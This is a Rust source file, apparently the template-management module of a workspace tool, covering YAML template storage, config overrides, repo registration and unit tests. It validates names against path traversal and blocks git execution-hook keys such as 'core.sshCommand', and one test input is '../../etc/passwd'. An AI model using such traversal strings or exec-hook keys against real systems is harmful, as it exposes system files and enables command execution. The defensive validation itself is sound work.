use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};

use anyhow::{Context, Result, bail};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};

use crate::config::{self, Paths, RepoEntry};
use crate::filelock;
use crate::giturl;
use crate::mirror;
use crate::workspace;

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct Template {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub name: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub wsp_version: Option<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub repos: Vec<TemplateRepo>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub config: Option<TemplateConfig>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub agent_md: Option<String>,
    /// Commands to run in each repo clone after workspace creation or `wsp add`.
    /// Users are prompted for approval before any command runs. Approvals are
    /// stored by content hash so future clones skip the prompt unless commands change.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub setup_commands: Option<Vec<String>>,
}

#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct TemplateConfig {
    #[serde(
        default,
        skip_serializing_if = "Option::is_none",
        rename = "lang",
        alias = "language_integrations"
    )]
    pub language_integrations: Option<std::collections::BTreeMap<String, bool>>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sync_strategy: Option<String>,
    #[serde(
        default,
        skip_serializing_if = "Option::is_none",
        rename = "git",
        alias = "git_config"
    )]
    pub git_config: Option<std::collections::BTreeMap<String, String>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TemplateRepo {
    pub url: String,
}

impl Template {
    /// Apply template config onto global config, returning a modified copy.
    /// Template config overrides global config; absent template fields leave config unchanged.
    pub fn apply_config(&self, cfg: &config::Config) -> config::Config {
        let mut effective = cfg.clone();
        if let Some(ref settings) = self.config {
            if let Some(ref li) = settings.language_integrations {
                let target = effective
                    .language_integrations
                    .get_or_insert_with(std::collections::BTreeMap::new);
                for (k, v) in li {
                    target.insert(k.clone(), *v);
                }
            }
            if let Some(ref strategy) = settings.sync_strategy {
                effective.sync_strategy = Some(strategy.clone());
            }
            if let Some(ref gc) = settings.git_config {
                let target = effective
                    .git_config
                    .get_or_insert_with(std::collections::BTreeMap::new);
                for (k, v) in gc {
                    // Defense-in-depth: skip dangerous keys even if they slipped
                    // through load-time validation (e.g. programmatic construction).
                    if crate::config::validate_git_config_key(k).is_err() {
                        eprintln!(
                            "warning: template git config key {:?} is not allowed and was skipped",
                            k
                        );
                        continue;
                    }
                    target.insert(k.clone(), v.clone());
                }
            }
        }
        effective
    }

    /// Returns true if the template includes any customizations beyond repos
    /// (config overrides, git config, agent instructions).
    pub fn has_customizations(&self) -> bool {
        self.agent_md.is_some()
            || self
                .config
                .as_ref()
                .is_some_and(|c| c != &TemplateConfig::default())
    }

    /// Print a summary of template customizations to stderr.
    /// Called before applying a template so users can see what it includes.
    pub fn print_customizations(&self) {
        if !self.has_customizations() {
            return;
        }

        eprintln!("Template includes:");

        if let Some(ref settings) = self.config {
            if let Some(ref strategy) = settings.sync_strategy {
                eprintln!("  sync-strategy: {}", strategy);
            }
            if let Some(ref li) = settings.language_integrations {
                for (name, enabled) in li {
                    eprintln!("  lang.{}: {}", name, enabled);
                }
            }
            if let Some(ref gc) = settings.git_config {
                for (key, value) in gc {
                    eprintln!("  git.{}: {}", key, value);
                }
            }
        }

        if let Some(ref content) = self.agent_md {
            let preview: String = content.lines().take(3).collect::<Vec<_>>().join("\n");
            let truncated = if content.lines().count() > 3 {
                format!("{}...", preview)
            } else {
                preview
            };
            eprintln!("  AGENTS.md content: {}", truncated);
        }
    }

    /// Derive identities from repo URLs using giturl::parse.
    pub fn identities(&self) -> Result<Vec<String>> {
        self.repos
            .iter()
            .map(|r| {
                let parsed = giturl::parse(&r.url)?;
                Ok(parsed.identity())
            })
            .collect()
    }
}

// ---------------------------------------------------------------------------
// Source classification
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Name validation
// ---------------------------------------------------------------------------

/// Validate a template name for safe use as a filesystem component.
///
/// Rejects: empty, null bytes, path separators (`/`, `\`), `..` traversal,
/// leading `-` or `.`, and `.source` suffix (reserved for import sidecar files).
///
/// Called at the storage layer (`save`, `load`, `delete`, `save_source`, etc.)
/// and at the discovery boundary (`scan_repo_dir`, `scan_bare_mirror`).
pub fn validate_name(name: &str) -> Result<()> {
    if name.is_empty() {
        bail!("template name cannot be empty");
    }
    if name.contains('\0') {
        bail!("template name cannot contain null bytes");
    }
    if name.contains('/') || name.contains('\\') {
        bail!("template name {:?} cannot contain path separators", name);
    }
    if name.contains("..") {
        bail!("template name {:?} cannot contain \"..\"", name);
    }
    if name.starts_with('-') {
        bail!("template name {:?} cannot start with a dash", name);
    }
    if name.starts_with('.') {
        bail!("template name {:?} cannot start with a dot", name);
    }
    if name.ends_with(".source") {
        bail!(
            "template name {:?} is reserved (conflicts with import metadata)",
            name
        );
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Stored template CRUD
// ---------------------------------------------------------------------------

fn template_path(templates_dir: &Path, name: &str) -> PathBuf {
    templates_dir.join(format!("{}.yaml", name))
}

pub fn save(templates_dir: &Path, name: &str, template: &Template) -> Result<()> {
    validate_name(name)?;
    fs::create_dir_all(templates_dir)?;
    let path = template_path(templates_dir, name);
    let data = serde_yaml_ng::to_string(template)?;
    let mut tmp = tempfile::NamedTempFile::new_in(templates_dir)
        .context("creating temp file for template")?;
    tmp.write_all(data.as_bytes())
        .context("writing template to temp file")?;
    tmp.persist(&path)
        .context("renaming temp file to template")?;
    Ok(())
}

pub fn load(templates_dir: &Path, name: &str) -> Result<Template> {
    validate_name(name)?;
    let path = template_path(templates_dir, name);
    if !path.exists() {
        bail!("template {:?} not found", name);
    }
    load_from_file(&path)
}

pub fn delete(templates_dir: &Path, name: &str) -> Result<()> {
    validate_name(name)?;
    let path = template_path(templates_dir, name);
    // Use remove_file directly to avoid TOCTOU race with exists() check
    match fs::remove_file(&path) {
        Ok(()) => {
            // Clean up sidecar source metadata if present
            let _ = delete_source(templates_dir, name);
            Ok(())
        }
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            bail!("template {:?} not found", name)
        }
        Err(e) => Err(e).with_context(|| format!("removing template {:?}", name)),
    }
}

pub fn rename(templates_dir: &Path, old_name: &str, new_name: &str, force: bool) -> Result<()> {
    validate_name(old_name)?;
    validate_name(new_name)?;

    let old_path = template_path(templates_dir, old_name);
    let new_path = template_path(templates_dir, new_name);

    if !old_path.exists() {
        bail!("template {:?} not found", old_name);
    }
    if new_path.exists() && !force {
        bail!(
            "template {:?} already exists (use --force to overwrite)",
            new_name
        );
    }

    // If forcing over an existing template, clean up its sidecar first
    if force && new_path.exists() {
        let _ = delete_source(templates_dir, new_name);
    }

    fs::rename(&old_path, &new_path)
        .with_context(|| format!("renaming template {:?} to {:?}", old_name, new_name))?;

    // Rename source sidecar if present
    let old_source = source_path(templates_dir, old_name);
    let new_source = source_path(templates_dir, new_name);
    if old_source.exists() {
        fs::rename(&old_source, &new_source).with_context(|| {
            format!("renaming source metadata {:?} to {:?}", old_name, new_name)
        })?;
    }

    Ok(())
}

pub fn list(templates_dir: &Path) -> Result<Vec<String>> {
    if !templates_dir.exists() {
        return Ok(Vec::new());
    }
    let mut names = Vec::new();
    for entry in fs::read_dir(templates_dir)? {
        let entry = entry?;
        let path = entry.path();
        if path.extension().is_some_and(|e| e == "yaml")
            && let Some(stem) = path.file_stem().and_then(|s| s.to_str())
        {
            // Skip sidecar source metadata files (e.g., dash.source.yaml)
            if stem.ends_with(".source") {
                continue;
            }
            names.push(stem.to_string());
        }
    }
    names.sort();
    Ok(names)
}

pub fn exists(templates_dir: &Path, name: &str) -> bool {
    validate_name(name).is_ok() && template_path(templates_dir, name).exists()
}

// ---------------------------------------------------------------------------
// Validation
// ---------------------------------------------------------------------------

/// Reject agent_md content that contains wsp markers, which would corrupt
/// the marker-based section management in AGENTS.md.
/// Reject templates that contain dangerous git config keys.
/// This is the load-time defense-in-depth check; `set_config` is the
/// interactive check. Together they prevent a crafted template file from
/// silently configuring `core.sshCommand` or similar execution hooks.
fn validate_template_git_config_keys(tmpl: &Template) -> Result<()> {
    let Some(config) = &tmpl.config else {
        return Ok(());
    };
    let Some(git_config) = &config.git_config else {
        return Ok(());
    };
    for key in git_config.keys() {
        crate::config::validate_git_config_key(key)
            .with_context(|| format!("template contains disallowed git config key '{}'", key))?;
    }
    Ok(())
}

fn validate_agent_md(tmpl: &Template) -> Result<()> {
    if let Some(ref content) = tmpl.agent_md
        && (content.contains(crate::agentmd::MARKER_BEGIN)
            || content.contains(crate::agentmd::MARKER_END))
    {
        bail!("agent_md content cannot contain wsp markers (<!-- wsp:begin/end -->)");
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Load from file
// ---------------------------------------------------------------------------

/// Load a template from a local file path.
/// Accepts both the template format (`repos: [{url: ...}]`) and the
/// .wsp.yaml metadata format (`repos: {identity: {url: ...}}`).
pub fn load_from_file(path: &Path) -> Result<Template> {
    let data = crate::util::read_yaml_file(path)
        .with_context(|| format!("loading template {:?}", path))?;

    // Try template format first
    let tmpl_err = match serde_yaml_ng::from_str::<Template>(&data) {
        Ok(t) => {
            if t.repos.is_empty() {
                bail!("template {:?} has no repos", path);
            }
            validate_agent_md(&t)?;
            validate_template_git_config_keys(&t)?;
            return Ok(t);
        }
        Err(e) => e,
    };

    // Try .wsp.yaml metadata format
    let tmpl = match serde_yaml_ng::from_str::<workspace::Metadata>(&data) {
        Ok(meta) => template_from_metadata(&meta)?,
        Err(meta_err) => bail!(
            "could not parse {:?}:\n  as template: {}\n  as .wsp.yaml: {}",
            path,
            tmpl_err,
            meta_err
        ),
    };
    validate_agent_md(&tmpl)?;
    validate_template_git_config_keys(&tmpl)?;
    Ok(tmpl)
}

/// Convert a .wsp.yaml Metadata into a Template by extracting repo URLs.
fn template_from_metadata(meta: &workspace::Metadata) -> Result<Template> {
    let mut repos = Vec::new();
    for (identity, repo_ref) in &meta.repos {
        let url = repo_ref
            .as_ref()
            .and_then(|r| r.url.clone())
            .ok_or_else(|| {
                anyhow::anyhow!(
                    "repo {:?} in .wsp.yaml has no URL — cannot use as template",
                    identity
                )
            })?;
        repos.push(TemplateRepo { url });
    }
    if repos.is_empty() {
        bail!("no repos in .wsp.yaml");
    }
    Ok(Template {
        name: None,
        description: None,
        wsp_version: None,
        repos,
        config: None,
        agent_md: None,
        setup_commands: None,
    })
}

/// Read only the `setup_commands` field from a repo's `.wsp.yaml`.
///
/// The file is deserialized as a [`Template`] — per-repo `.wsp.yaml` and
/// template files share the same schema. Returns `None` if the file
/// doesn't exist, can't be read, or has no `setup_commands`.
pub fn read_setup_commands(path: &Path) -> Option<Vec<String>> {
    let content = std::fs::read_to_string(path).ok()?;
    let tmpl: Template = serde_yaml_ng::from_str(&content).ok()?;
    tmpl.setup_commands.filter(|v| !v.is_empty())
}

/// Serialize a template to YAML string.
pub fn to_yaml(template: &Template) -> Result<String> {
    serde_yaml_ng::to_string(template).context("serializing template")
}

// ---------------------------------------------------------------------------
// Import source tracking (sidecar metadata)
// ---------------------------------------------------------------------------

/// Tracks where an imported template came from, stored as a sidecar file.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ImportSource {
    pub source_path: String,
    pub imported_at: DateTime<Utc>,
}

fn source_path(templates_dir: &Path, name: &str) -> PathBuf {
    templates_dir.join(format!("{}.source.yaml", name))
}

pub fn save_source(templates_dir: &Path, name: &str, source: &ImportSource) -> Result<()> {
    validate_name(name)?;
    fs::create_dir_all(templates_dir)?;
    let path = source_path(templates_dir, name);
    let data = serde_yaml_ng::to_string(source)?;
    let mut tmp = tempfile::NamedTempFile::new_in(templates_dir)
        .context("creating temp file for source metadata")?;
    tmp.write_all(data.as_bytes())
        .context("writing source metadata")?;
    tmp.persist(&path)
        .context("renaming temp file to source metadata")?;
    Ok(())
}

pub fn load_source(templates_dir: &Path, name: &str) -> Result<Option<ImportSource>> {
    validate_name(name)?;
    let path = source_path(templates_dir, name);
    if !path.exists() {
        return Ok(None);
    }
    let data = crate::util::read_yaml_file(&path)
        .with_context(|| format!("loading source metadata for {:?}", name))?;
    let source: ImportSource = serde_yaml_ng::from_str(&data).context("parsing source metadata")?;
    Ok(Some(source))
}

pub fn delete_source(templates_dir: &Path, name: &str) -> Result<()> {
    validate_name(name)?;
    let path = source_path(templates_dir, name);
    match fs::remove_file(&path) {
        Ok(()) => Ok(()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(e) => Err(e).with_context(|| format!("removing source metadata for {:?}", name)),
    }
}

/// Derive a template name from a file path, in order of preference:
/// 1. `name` field inside the YAML
/// 2. Filename stem (e.g., `dash.wsp.yaml` → `dash`)
pub fn derive_name_from_file(path: &Path, template: &Template) -> String {
    if let Some(ref name) = template.name {
        return name.clone();
    }
    // Strip .wsp.yaml or .yaml suffix
    let filename = path
        .file_name()
        .and_then(|f| f.to_str())
        .unwrap_or("template");
    filename
        .strip_suffix(".wsp.yaml")
        .or_else(|| filename.strip_suffix(".yaml"))
        .unwrap_or(filename)
        .to_string()
}

// ---------------------------------------------------------------------------
// Workspace derivation
// ---------------------------------------------------------------------------

/// Create a template from an existing workspace's repo set.
/// Uses URLs from .wsp.yaml if available, falls back to registry.
pub fn from_workspace(paths: &Paths, ws_name: &str) -> Result<Template> {
    workspace::validate_name(ws_name)?;
    let ws_dir = workspace::dir(&paths.workspaces_dir, ws_name);
    let meta = workspace::load_metadata(&ws_dir)
        .with_context(|| format!("loading workspace {:?}", ws_name))?;
    let cfg = config::Config::load_from(&paths.config_path)?;

    let mut repos = Vec::new();
    for (identity, repo_ref) in &meta.repos {
        // Prefer URL from .wsp.yaml, fall back to registry
        let url = repo_ref
            .as_ref()
            .and_then(|r| r.url.clone())
            .or_else(|| cfg.upstream_url(identity).map(|s| s.to_string()))
            .ok_or_else(|| {
                anyhow::anyhow!("repo {:?} has no URL in .wsp.yaml or registry", identity)
            })?;
        repos.push(TemplateRepo { url });
    }

    if repos.is_empty() {
        bail!("workspace {:?} has no repos", ws_name);
    }

    // Extract user-written AGENTS.md content if present
    let agent_md = {
        let agents_path = ws_dir.join("AGENTS.md");
        if agents_path.exists() {
            let content = fs::read_to_string(&agents_path).ok().unwrap_or_default();
            crate::agentmd::extract_user_content(&content)
        } else {
            None
        }
    };

    Ok(Template {
        name: None,
        description: None,
        wsp_version: None,
        repos,
        config: None,
        agent_md,
        setup_commands: None,
    })
}

// ---------------------------------------------------------------------------
// Auto-registration
// ---------------------------------------------------------------------------

/// Auto-register any repos from a template that aren't already in the registry.
/// Clones mirrors and adds entries to config.
pub fn auto_register(tmpl: &Template, cfg: &mut config::Config, paths: &Paths) -> Result<()> {
    let mut to_register = Vec::new();

    for repo in &tmpl.repos {
        let parsed = giturl::parse(&repo.url)?;
        let identity = parsed.identity();
        if !cfg.repos.contains_key(&identity) {
            to_register.push((identity, parsed, repo.url.clone()));
        }
    }

    if to_register.is_empty() {
        return Ok(());
    }

    eprintln!(
        "Auto-registering {} repos from template...",
        to_register.len()
    );

    for (identity, parsed, url) in &to_register {
        if !mirror::exists(&paths.mirrors_dir, parsed) {
            eprintln!("  cloning {}...", url);
            mirror::clone(&paths.mirrors_dir, parsed, url)
                .map_err(|e| anyhow::anyhow!("cloning {}: {}", identity, e))?;
        }
    }

    // Register under lock
    filelock::with_config(&paths.config_path, |locked_cfg| {
        for (identity, _, url) in &to_register {
            if !locked_cfg.repos.contains_key(identity) {
                locked_cfg.repos.insert(
                    identity.clone(),
                    RepoEntry {
                        url: url.clone(),
                        added: Utc::now(),
                    },
                );
            }
        }
        Ok(())
    })?;

    // Update the in-memory config to reflect the new repos
    for (identity, _, url) in to_register {
        cfg.repos.insert(
            identity,
            RepoEntry {
                url,
                added: Utc::now(),
            },
        );
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Template mutation helpers
// ---------------------------------------------------------------------------

/// Valid key prefixes for template config. Global-only keys like `branch-prefix`,
/// `workspaces-dir`, `gc.retention-days`, and `agent-md` are not valid here.
const VALID_TEMPLATE_CONFIG_PREFIXES: &[&str] = &["lang.", "sync-strategy", "git."];

///// Normalize a config key: convert underscores to hyphens and map old prefixes to new.
pub fn normalize_key(key: &str) -> String {
    let key = key.replace('_', "-");
    if let Some(rest) = key.strip_prefix("git-config.") {
        return format!("git.{rest}");
    }
    if let Some(rest) = key.strip_prefix("language-integrations.") {
        return format!("lang.{rest}");
    }
    if key == "language-integrations" {
        return "lang".into();
    }
    if key == "experimental.shell-tmux" {
        return "shell.tmux".into();
    }
    if key == "experimental.shell-prompt" {
        return "shell.prompt".into();
    }
    key
}

/// Validate that a config key is valid for template config.
pub fn validate_template_config_key(key: &str) -> Result<()> {
    let normalized = normalize_key(key);
    for prefix in VALID_TEMPLATE_CONFIG_PREFIXES {
        if normalized == *prefix.trim_end_matches('.') || normalized.starts_with(prefix) {
            return Ok(());
        }
    }
    bail!(
        "invalid template config key {:?}; valid key patterns: lang.<name>, sync-strategy, git.<key>",
        key
    );
}

/// Add repos to a template. Idempotent: repos already present are skipped.
/// Matches by identity (not just URL) so `git@` and `https://` for the same repo
/// are treated as duplicates. Returns the list of skipped repo URLs.
pub fn add_repos(template: &mut Template, urls: Vec<String>) -> Result<Vec<String>> {
    let mut skipped = Vec::new();
    let existing_identities: std::collections::HashSet<String> = template
        .repos
        .iter()
        .filter_map(|r| giturl::parse(&r.url).ok().map(|p| p.identity()))
        .collect();

    for url in urls {
        // Validate URL is parseable
        let parsed = giturl::parse(&url)
            .map_err(|e| anyhow::anyhow!("invalid repo URL {:?}: {}", url, e))?;

        if existing_identities.contains(&parsed.identity()) {
            skipped.push(url);
        } else {
            template.repos.push(TemplateRepo { url });
        }
    }
    Ok(skipped)
}

/// Remove repos from a template. Matches by URL, identity, or shortname.
/// Uses `giturl::resolve` for shortname matching — errors on ambiguous or not-found.
pub fn remove_repos(template: &mut Template, urls_or_identities: Vec<String>) -> Result<()> {
    // Resolve each input to a URL for unambiguous matching
    let identities: Vec<String> = template
        .repos
        .iter()
        .filter_map(|r| giturl::parse(&r.url).ok().map(|p| p.identity()))
        .collect();

    let mut urls_to_remove = std::collections::HashSet::new();
    for input in &urls_or_identities {
        // Try exact URL match first
        if template.repos.iter().any(|r| r.url == *input) {
            urls_to_remove.insert(input.clone());
            continue;
        }
        // Resolve via identity/shortname using giturl::resolve (handles ambiguity)
        let identity = giturl::resolve(input, &identities).map_err(|e| {
            let current: Vec<&str> = template.repos.iter().map(|r| r.url.as_str()).collect();
            anyhow::anyhow!("{} in template; current repos: {:?}", e, current)
        })?;
        // Find the URL for this identity
        let url = template
            .repos
            .iter()
            .find(|r| {
                giturl::parse(&r.url).ok().map(|p| p.identity()).as_deref() == Some(&identity)
            })
            .map(|r| r.url.clone())
            .unwrap(); // safe: resolve succeeded against identities from this list
        urls_to_remove.insert(url);
    }

    template.repos.retain(|r| !urls_to_remove.contains(&r.url));
    Ok(())
}

/// Set a template config value. Validates key prefix and value type.
pub fn set_config(template: &mut Template, key: &str, value: &str) -> Result<()> {
    let normalized = normalize_key(key);
    validate_template_config_key(key)?;

    let config = template.config.get_or_insert_with(TemplateConfig::default);

    if normalized == "sync-strategy" {
        match value {
            "rebase" | "merge" => {}
            _ => bail!("sync-strategy must be 'rebase' or 'merge'"),
        }
        config.sync_strategy = Some(value.to_string());
    } else if let Some(lang) = normalized.strip_prefix("lang.") {
        let enabled: bool = value
            .parse()
            .map_err(|_| anyhow::anyhow!("value for lang must be true or false"))?;
        let li = config
            .language_integrations
            .get_or_insert_with(std::collections::BTreeMap::new);
        li.insert(lang.to_string(), enabled);
    } else if let Some(git_key) = normalized.strip_prefix("git.") {
        if git_key.is_empty() {
            bail!("git key cannot be empty");
        }
        crate::config::validate_git_config_key(git_key)?;
        let gc = config
            .git_config
            .get_or_insert_with(std::collections::BTreeMap::new);
        gc.insert(git_key.to_string(), value.to_string());
    }

    Ok(())
}

/// Get a template config value.
pub fn get_config(template: &Template, key: &str) -> Result<Option<String>> {
    let normalized = normalize_key(key);
    validate_template_config_key(key)?;

    let config = match &template.config {
        Some(c) => c,
        None => return Ok(None),
    };

    if normalized == "sync-strategy" {
        Ok(config.sync_strategy.clone())
    } else if let Some(lang) = normalized.strip_prefix("lang.") {
        Ok(config
            .language_integrations
            .as_ref()
            .and_then(|m| m.get(lang))
            .map(|v| v.to_string()))
    } else if let Some(git_key) = normalized.strip_prefix("git.") {
        Ok(config
            .git_config
            .as_ref()
            .and_then(|m| m.get(git_key))
            .cloned())
    } else {
        Ok(None)
    }
}

/// Unset a template config value. Cleans up empty maps/Options.
pub fn unset_config(template: &mut Template, key: &str) -> Result<()> {
    let normalized = normalize_key(key);
    validate_template_config_key(key)?;

    let config = match &mut template.config {
        Some(c) => c,
        None => return Ok(()),
    };

    if normalized == "sync-strategy" {
        config.sync_strategy = None;
    } else if let Some(lang) = normalized.strip_prefix("lang.") {
        if let Some(ref mut m) = config.language_integrations {
            m.remove(lang);
            if m.is_empty() {
                config.language_integrations = None;
            }
        }
    } else if let Some(git_key) = normalized.strip_prefix("git.")
        && let Some(ref mut m) = config.git_config
    {
        m.remove(git_key);
        if m.is_empty() {
            config.git_config = None;
        }
    }

    // Clean up empty config
    if *config == TemplateConfig::default() {
        template.config = None;
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_template() -> Template {
        Template {
            name: None,
            description: None,
            wsp_version: None,
            repos: vec![
                TemplateRepo {
                    url: "git@github.com:acme/api-gateway.git".into(),
                },
                TemplateRepo {
                    url: "git@github.com:acme/user-service.git".into(),
                },
            ],
            config: None,
            agent_md: None,
            setup_commands: None,
        }
    }

    #[test]
    fn save_and_load_round_trip() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("templates");

        let t = sample_template();
        save(&dir, "dash", &t).unwrap();

        let loaded = load(&dir, "dash").unwrap();
        assert_eq!(loaded.repos.len(), 2);
        assert_eq!(loaded.repos[0].url, "git@github.com:acme/api-gateway.git");
        assert_eq!(loaded.repos[1].url, "git@github.com:acme/user-service.git");
    }

    #[test]
    fn load_not_found() {
        let tmp = tempfile::tempdir().unwrap();
        let err = load(tmp.path(), "nonexistent").unwrap_err();
        assert!(err.to_string().contains("not found"));
    }

    #[test]
    fn delete_removes_file() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("templates");

        save(&dir, "dash", &sample_template()).unwrap();
        assert!(exists(&dir, "dash"));

        delete(&dir, "dash").unwrap();
        assert!(!exists(&dir, "dash"));
    }

    #[test]
    fn delete_not_found() {
        let tmp = tempfile::tempdir().unwrap();
        let err = delete(tmp.path(), "nonexistent").unwrap_err();
        assert!(err.to_string().contains("not found"));
    }

    #[test]
    fn rename_basic() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("templates");

        save(&dir, "old-name", &sample_template()).unwrap();
        assert!(exists(&dir, "old-name"));

        rename(&dir, "old-name", "new-name", false).unwrap();
        assert!(!exists(&dir, "old-name"));
        assert!(exists(&dir, "new-name"));

        // Content preserved
        let t = load(&dir, "new-name").unwrap();
        assert_eq!(t.repos.len(), 2);
    }

    #[test]
    fn rename_with_sidecar() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("templates");

        save(&dir, "old", &sample_template()).unwrap();
        save_source(
            &dir,
            "old",
            &ImportSource {
                source_path: "/tmp/test.yaml".into(),
                imported_at: chrono::Utc::now(),
            },
        )
        .unwrap();

        rename(&dir, "old", "new", false).unwrap();
        assert!(!exists(&dir, "old"));
        assert!(exists(&dir, "new"));
        let source = load_source(&dir, "new").unwrap();
        assert!(source.is_some());
        assert!(load_source(&dir, "old").unwrap().is_none());
    }

    #[test]
    fn rename_not_found() {
        let tmp = tempfile::tempdir().unwrap();
        let err = rename(tmp.path(), "nonexistent", "new", false).unwrap_err();
        assert!(err.to_string().contains("not found"));
    }

    #[test]
    fn rename_target_exists() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("templates");

        save(&dir, "a", &sample_template()).unwrap();
        save(&dir, "b", &sample_template()).unwrap();

        let err = rename(&dir, "a", "b", false).unwrap_err();
        assert!(err.to_string().contains("already exists"));
    }

    #[test]
    fn rename_force_overwrites() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("templates");

        save(&dir, "a", &sample_template()).unwrap();
        save(&dir, "b", &sample_template()).unwrap();

        rename(&dir, "a", "b", true).unwrap();
        assert!(!exists(&dir, "a"));
        assert!(exists(&dir, "b"));
    }

    #[test]
    fn list_templates() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("templates");

        assert!(list(&dir).unwrap().is_empty());

        save(&dir, "backend", &sample_template()).unwrap();
        save(&dir, "frontend", &sample_template()).unwrap();

        let names = list(&dir).unwrap();
        assert_eq!(names, vec!["backend", "frontend"]);
    }

    #[test]
    fn identities_from_template() {
        let t = sample_template();
        let ids = t.identities().unwrap();
        assert_eq!(
            ids,
            vec![
                "github.com/acme/api-gateway",
                "github.com/acme/user-service",
            ]
        );
    }

    #[test]
    fn load_empty_repos_errors() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("templates");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("empty.yaml"), "repos: []\n").unwrap();

        let err = load(&dir, "empty").unwrap_err();
        assert!(err.to_string().contains("no repos"));
    }

    #[test]
    fn validate_name_rejects_traversal() {
        struct Case {
            name: &'static str,
            input: &'static str,
            want_err: bool,
        }

        let cases = vec![
            Case {
                name: "valid simple name",
                input: "backend",
                want_err: false,
            },
            Case {
                name: "valid with hyphens",
                input: "my-team-backend",
                want_err: false,
            },
            Case {
                name: "empty",
                input: "",
                want_err: true,
            },
            Case {
                name: "path traversal",
                input: "../../etc/passwd",
                want_err: true,
            },
            Case {
                name: "dot-dot in middle",
                input: "foo..bar",
                want_err: true,
            },
            Case {
                name: "forward slash",
                input: "foo/bar",
                want_err: true,
            },
            Case {
                name: "backslash",
                input: "foo\\bar",
                want_err: true,
            },
            Case {
                name: "starts with dot",
                input: ".hidden",
                want_err: true,
            },
            Case {
                name: "starts with dash",
                input: "-flag",
                want_err: true,
            },
            Case {
                name: "null byte",
                input: "foo\0bar",
                want_err: true,
            },
            Case {
                name: "source suffix reserved",
                input: "foo.source",
                want_err: true,
            },
            Case {
                name: "source in middle is ok",
                input: "source-code",
                want_err: false,
            },
        ];

        for tc in cases {
            let result = validate_name(tc.input);
            assert_eq!(result.is_err(), tc.want_err, "case: {}", tc.name);
        }
    }

    #[test]
    fn load_from_file_round_trip() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("test.wsp.yaml");

        let t = sample_template();
        let yaml = to_yaml(&t).unwrap();
        std::fs::write(&path, &yaml).unwrap();

        let loaded = load_from_file(&path).unwrap();
        assert_eq!(loaded.repos.len(), 2);
        assert_eq!(loaded.repos[0].url, t.repos[0].url);
    }

    #[test]
    fn load_from_file_missing() {
        let result = load_from_file(Path::new("/nonexistent/template.yaml"));
        assert!(result.is_err());
    }

    #[test]
    fn load_from_file_accepts_wsp_yaml_format() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("workspace.wsp.yaml");
        std::fs::write(
            &path,
            r#"
name: my-feature
branch: my-feature
repos:
  github.com/acme/api-gateway:
    url: git@github.com:acme/api-gateway.git
  github.com/acme/user-service:
    url: git@github.com:acme/user-service.git
created: 2026-03-07T10:00:00Z
"#,
        )
        .unwrap();

        let loaded = load_from_file(&path).unwrap();
        assert_eq!(loaded.repos.len(), 2);
        // URLs are extracted from the metadata format
        let urls: Vec<&str> = loaded.repos.iter().map(|r| r.url.as_str()).collect();
        assert!(urls.contains(&"git@github.com:acme/api-gateway.git"));
        assert!(urls.contains(&"git@github.com:acme/user-service.git"));
    }

    #[test]
    fn load_from_file_empty_repos() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("empty.yaml");
        std::fs::write(&path, "repos: []\n").unwrap();

        let err = load_from_file(&path).unwrap_err();
        assert!(err.to_string().contains("no repos"));
    }

    #[test]
    fn to_yaml_round_trip() {
        let t = sample_template();
        let yaml = to_yaml(&t).unwrap();
        let parsed: Template = serde_yaml_ng::from_str(&yaml).unwrap();
        assert_eq!(parsed.repos.len(), t.repos.len());
        assert_eq!(parsed.repos[0].url, t.repos[0].url);
    }

    #[test]
    fn apply_config_overrides_config() {
        use std::collections::BTreeMap;

        let mut cfg = config::Config::default();
        cfg.sync_strategy = Some("rebase".into());
        let mut li = BTreeMap::new();
        li.insert("go".into(), false);
        cfg.language_integrations = Some(li);

        let tmpl = Template {
            name: None,
            description: None,
            wsp_version: None,
            repos: vec![],
            config: Some(TemplateConfig {
                language_integrations: Some(BTreeMap::from([("go".into(), true)])),
                sync_strategy: Some("merge".into()),
                git_config: None,
            }),
            agent_md: None,
            setup_commands: None,
        };

        let effective = tmpl.apply_config(&cfg);
        assert_eq!(effective.sync_strategy.as_deref(), Some("merge"));
        assert_eq!(
            effective.language_integrations.as_ref().unwrap()["go"],
            true
        );
    }

    #[test]
    fn apply_config_preserves_config_when_absent() {
        use std::collections::BTreeMap;

        let mut cfg = config::Config::default();
        cfg.sync_strategy = Some("rebase".into());
        let mut li = BTreeMap::new();
        li.insert("go".into(), true);
        cfg.language_integrations = Some(li);

        let tmpl = Template {
            name: None,
            description: None,
            wsp_version: None,
            repos: vec![],
            config: None,
            agent_md: None,
            setup_commands: None,
        };

